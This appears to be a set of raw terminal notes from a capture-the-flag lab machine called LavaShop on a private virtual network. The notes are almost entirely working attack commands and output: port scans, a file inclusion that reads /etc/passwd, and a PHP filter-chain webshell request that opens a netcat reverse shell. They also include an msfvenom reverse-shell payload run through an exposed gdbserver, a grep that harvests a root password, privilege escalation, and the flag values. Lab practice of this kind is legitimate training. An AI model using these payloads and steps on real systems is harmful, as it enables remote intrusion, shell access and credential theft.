┌──(kali㉿kali)-[~/Documents/lavashop]
└─$ cat scan.txt       
# Nmap 7.95 scan initiated Mon Oct 20 16:41:57 2025 as: /usr/lib/nmap/nmap --privileged -sS -p- --open --min-rate 5000 -Pn -n -oN scan.txt 192.168.56.8
Nmap scan report for 192.168.56.8
Host is up (0.000099s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
1337/tcp open  waste
MAC Address: 08:00:27:38:01:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

# Nmap done at Mon Oct 20 16:42:00 2025 -- 1 IP address (1 host up) scanned in 2.94 seconds
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/lavashop]
└─$ 






====================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/lavashop]
└─$ cat fullscan.txt 
# Nmap 7.95 scan initiated Mon Oct 20 16:43:03 2025 as: /usr/lib/nmap/nmap --privileged -sVC -p22,80,1337 -vvv -n -Pn -oN fullscan.txt 192.168.56.8
Nmap scan report for 192.168.56.8
Host is up, received arp-response (0.00040s latency).
Scanned at 2025-10-20 16:43:04 EDT for 11s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.62
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://lavashop.thl/
|_http-server-header: Apache/2.4.62 (Debian)
1337/tcp open  waste?  syn-ack ttl 64
MAC Address: 08:00:27:38:01:97 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 20 16:43:15 2025 -- 1 IP address (1 host up) scanned in 12.39 seconds
                                                                                                                                                  
┌──(kali㉿kali)-[~/Documents/lavashop]
└─$ 

====================================================================================================================================================================

====================================================================================================================================================================

====================================================================================================================================================================

curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'






─$ curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'  



  <section style="margin-bottom:1.5rem; padding:1rem; background:rgba(0,0,0,.25); border:1px solid rgba(255,255,255,.1); border-radius:12px;">
    <p style="margin:0 0 .75rem;">Incluyendo: <code>/etc/passwd</code></p>
    <pre style="white-space:pre-wrap; overflow:auto; padding:.75rem; background:rgba(0,0,0,.35); border-radius:8px;">
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Rodri:x:1001:1001::/home/Rodri:/bin/bash
    </pre>
  </section>

<section>
  <h2>Productos destacados</h2>
  <div class="product-grid">
    <article class="product">
      <img src="/assets/images/lamp1.jpg" alt="Lámpara de lava azul">
      <h3>Lava Classic - Azul</h3>
      <p>Lámpara clásica de lava azul, llega a ser hipnotizante.</p>
    </article>
    <article class="product">
      <img src="/assets/images/lamp2.jpg" alt="Lámpara de lava roja">
      <h3>Lava Premium - Rojo</h3>
      <p>Lámpara clásica de lava roja, llega a ser hipnotizante.</p>
    </article>
    <article class="product">   
      <img src="/assets/images/lamparasal.jpg" alt="Lámpara de sal del Himalaya">
      <h3>Lámpara de sal</h3>
      <p>Lámpara de sal del Himalaya, te otorgará calma para los CTFs avanzados.</p>
    </article>
    <article class="product">   
      <img src="/assets/images/lamparaplasma.jpg" alt="Lámpara de plasma">
      <h3>Lámpara de plasma</h3>
      <p>Lámpara de plasma, dará ese toque hacker a tu habitación.</p>
    </article>
  </div>
</section>




====================================================================================================================================================================








python3 php_filter_chain_generator.py --chain '<?php phpinfo(); ?>  '




====================================================================================================================================================================
curl 'http://lavashop.thl/pages/products.php?file=/etc/passwd'   



python3 php_filter_chain_generator.py --chain '<?php eval(system(busybox nc 192.168.56.7 1234 -e /bin/bash)); ?>  ' 


python3 php_filter_chain_generator.py --chain '<?php eval(system($_GET["x"])); ?>  ' 

x=busybox nc 192.168.56.7 1234 -e /bin/bash

&x=busybox%20nc%20192.168.56.7%201234%20-e%20/bin/bash





GET /pages/products.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&x=busybox%20nc%20192.168.56.7%201234%20-e%20/bin/bash HTTP/1.1
Host: lavashop.thl
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://lavashop.thl/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive





┌──(kali㉿kali)-[~/Documents/lavashop]
└─$ nc -nlvp 1234
listening on [any] 1234 ...
whoami
connect to [192.168.56.7] from (UNKNOWN) [192.168.56.8] 56346
www-data



====================================================================================================================================================================

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbserver#pentesting-remote-gdbserver







msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.56.7 LPORT=4444 PrependFork=true -f elf -o binary.elf



chmod +x binary.elf

gdb binary.elf



# Conectar al gdbserver remoto

target extended-remote 192.168.56.8:1337

# Subir el archivo a la máquina víctima
remote put binary.elf binary.elf

# Establecer el archivo remoto a ejecutar
set remote exec-file /tmp/binary.elf

# Ejecutar el payload
run








┌──(kali㉿kali)-[~/Downloads/php_filter_chain_generator]
└─$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.56.7] from (UNKNOWN) [192.168.56.8] 60976
whoami
Rodri




====================================================================================================================================================================


Rodri@Thehackerslabs-LavaShop:/home/Rodri$ cat user.txt 
13dc7b1266b4aa6ca4cdab36b1596025



====================================================================================================================================================================


<www/html$ grep -r "ROOT_PASS" /etc /home /opt /var /usr/local 2>/dev/null
/etc/environment:ROOT_PASS=lalocadelaslamparas







====================================================================================================================================================================

www-data@Thehackerslabs-LavaShop:/etc$ su 
Password: lalocadelaslamparas


root@Thehackerslabs-LavaShop:/# cd root/
root@Thehackerslabs-LavaShop:~# ls
root.txt
root@Thehackerslabs-LavaShop:~# cat root.txt 
60493ecb4b8037433e584995b122c097
root@Thehackerslabs-LavaShop:~# 
